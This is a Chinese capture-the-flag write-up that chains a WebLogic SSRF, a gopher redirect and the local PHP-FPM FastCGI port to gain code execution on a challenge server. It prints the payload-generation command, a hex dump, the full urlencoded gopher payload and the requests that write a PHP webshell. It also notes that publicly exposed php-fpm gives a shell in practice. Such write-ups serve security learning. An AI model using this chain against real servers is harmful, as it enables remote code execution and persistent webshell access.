# 三个白帽之来自星星的你（一）writeup

第一次正式做三个白帽的题目，能做出来挺不容易，还踩了很多坑...

0x00 挑战介绍
=========

来自星星的你被我给丢了，我可能需要用我所有的一切才能把你找回，编了两句就编不下去了，好吧，我承认这是一期渗透题，就是这么直接。

*   tips 1: SSRF
*   tips 2: 或许可以扫描下目录？
*   tips 3: /console/ 这个目录会对你有帮助

0x01 wp
=======

* * *

Discuz X3.2
-----------

打开页面首先是Discuz X3.2的站，搜了搜发现是6月1号才发布的新版本，稍微搜了搜网上的几个洞发现都已经被修复了，于是咸鱼了一夜，获得**hint:ssrf**

搜索依法发现长亭的rr菊苣发了一篇文章

[https://blog.chaitin.com/gopher-attack-surfaces/](https://blog.chaitin.com/gopher-attack-surfaces/)

里面提到discuz X3.2存在ssrf，利用ssrf+gopher协议可getshell

但是这个利用方式有个一个很重要的问题就是服务器必须开启 Gopher wrapper，且php运行方式是fastcgi。

扫一波目录发现了info.php，通过phpinfo()我们发现并没有开启 Gopher wrapper。

咸鱼了一会儿发现了**hint3/console/**

通过这个发现存在weblogin站。。。

webLogin
--------

这里的洞很简单了，稍微搜下发现

[WooYun: 央视网SSRF可窥探内网（Weblogic SSRF案例）](http://drops.com:8000/%3Ca%20target=)">[WooYun: 央视网SSRF可窥探内网（Weblogic SSRF案例）](http://www.wooyun.org/bugs/wooyun-2015-0136698)

测试发现**http://0761e975dda0c67cb.jie.sangebaimao.com/uddiexplorer/SearchPublicRegistries.jsp**这里的洞确实存在。

而且可以配合前面提到的gopher协议getshell

根据长亭博客的文章首先测试

在服务器构造

```
<?php
header("Location:gopher://服务器ip:2333/_test");
?>

```

然后在服务器监听2333端口

```
nc -lvv 2333

```

提交请求

```
http://0761e975dda0c67cb.jie.sangebaimao.com/uddiexplorer/SearchPublicRegistries.jsp?
operator=http://服务器ip/gopher.php
&rdoSearch=name
&txtSearchname=sdf
&txtSearchkey=

```

发现确实收到了test，确认gopher可利用

那么就是构造payload了

有篇很重要的文章关于fastcgi的利用

[http://zone.wooyun.org/content/1060](http://zone.wooyun.org/content/1060)

用exp生成payload

```
./fcgi_exp system 127.0.0.1 2333 /opt/discuz/info.php "echo ‘$_GET[x]($_POST[xx]);’ > /opt/discuz/data/test.php"

```

监听2333端口

```
nc -lvv 2333 > 1.txt

```

我们可以看下1.txt

```
root@ubuntu:/home/wwwroot/default/fcgi_exp# xxd 1.txt
0000000: 0101 0001 0008 0000 0001 0000 0000 0000  ................
0000010: 0104 0001 0112 0600 0f14 5343 5249 5054  ..........SCRIPT
0000020: 5f46 494c 454e 414d 452f 6f70 742f 6469  _FILENAME/opt/di
0000030: 7363 757a 2f69 6e66 6f2e 7068 700d 0144  scuz/info.php..D
0000040: 4f43 554d 454e 545f 524f 4f54 2f0f 1053  OCUMENT_ROOT/..S
0000050: 4552 5645 525f 534f 4654 5741 5245 676f  ERVER_SOFTWAREgo
0000060: 202f 2066 6367 6963 6c69 656e 7420 0b09   / fcgiclient ..
0000070: 5245 4d4f 5445 5f41 4444 5231 3237 2e30  REMOTE_ADDR127.0
0000080: 2e30 2e31 0f08 5345 5256 4552 5f50 524f  .0.1..SERVER_PRO
0000090: 544f 434f 4c48 5454 502f 312e 310e 0343  TOCOLHTTP/1.1..C
00000a0: 4f4e 5445 4e54 5f4c 454e 4754 4831 3033  ONTENT_LENGTH103
00000b0: 0e04 5245 5155 4553 545f 4d45 5448 4f44  ..REQUEST_METHOD
00000c0: 504f 5354 095b 5048 505f 5641 4c55 4561  POST.[PHP_VALUEa
00000d0: 6c6c 6f77 5f75 726c 5f69 6e63 6c75 6465  llow_url_include
00000e0: 203d 204f 6e0a 6469 7361 626c 655f 6675   = On.disable_fu
00000f0: 6e63 7469 6f6e 7320 3d20 0a73 6166 655f  nctions = .safe_
0000100: 6d6f 6465 203d 204f 6666 0a61 7574 6f5f  mode = Off.auto_
0000110: 7072 6570 656e 645f 6669 6c65 203d 2070  prepend_file = p
0000120: 6870 3a2f 2f69 6e70 7574 0000 0000 0000  hp://input......
0000130: 0104 0001 0000 0000 0105 0001 0067 0100  .............g..
0000140: 3c3f 7068 7020 7379 7374 656d 2827 6563  <?php system('ec
0000150: 686f 20e2 8098 5b61 5d28 5b68 685d 293b  ho ...[x]([xx]);
0000160: e280 9920 3e20 2f6f 7074 2f64 6973 6375  ... > /opt/discu
0000170: 7a2f 6461 7461 2f64 646f 672e 7068 7027  z/data/test.php'
0000180: 293b 6469 6528 272d 2d2d 2d2d 3076 6364  );die('-----0vcd
0000190: 6233 346f 6a75 3039 6238 6664 2d2d 2d2d  b34oju09b8fd----
00001a0: 2d0a 2729 3b3f 3e00                      -.');?>.

```

然后需要urlencode一下

```
>>> f = open('1.txt')
>>> ff = f.read()
>>> from urllib import quote
>>> quote(ff)
'%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%12%06%00%0F%14SCRIPT_FILENAME/opt/discuz/info.php%0D%01DOCUMENT_ROOT/%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%01%00%3C%3Fphp%20system%28%27echo%20%E2%80%98%5Bx%5D%28%5Bxx%5D%29%3B%E2%80%99%20%3E%20/opt/discuz/data/test.php%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00'

```

构造gopher.php

```
<?php
header("gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%12%06%00%0F%14SCRIPT_FILENAME/opt/discuz/info.php%0D%01DOCUMENT_ROOT/%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%01%00%3C%3Fphp%20system%28%27echo%20%E2%80%98%5Bx%5D%28%5Bxx%5D%29%3B%E2%80%99%20%3E%20/opt/discuz/data/test.php%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00");
?>

```

请求

```
http://0761e975dda0c67cb.jie.sangebaimao.com/uddiexplorer/SearchPublicRegistries.jsp?
operator=http://ip/gopher.php
&rdoSearch=name
&txtSearchname=sdf
&txtSearchkey=
&txtSearchfor=
&selfor=Business+location
&btnSubmit=Search

```

由于discuz的data默认可写，所以成功写入webshell，有个问题就是不知道为什么一直不能反弹shell进来

0x02 题目之后？
==========

* * *

在做完题目之后想要深究一波原理，结果突然发现题目其实去年的hitcon quals的web400 lalala

[http://kb.hitcon.org/post/131488130087/hitcon-ctf-2015-quals-web-%E5%87%BA%E9%A1%8C%E5%BF%83%E5%BE%97](http://kb.hitcon.org/post/131488130087/hitcon-ctf-2015-quals-web-%E5%87%BA%E9%A1%8C%E5%BF%83%E5%BE%97)

整个题目的核心概念就是通过302 绕过限制 SSRF，然后通过 SSRF 中的 gopher 去利用本地的 FastCGI prtocol 实现远程代码执行

实际中如果php fastcgi对公网开放，那么就可以拿shell

php-fpm默认监听9000端口，使用 PHP_ADMIN_VALUE 把 allow_url_include 设为 on 以及新增 auto_prepend_file，利用php://input执行php代码写一个shell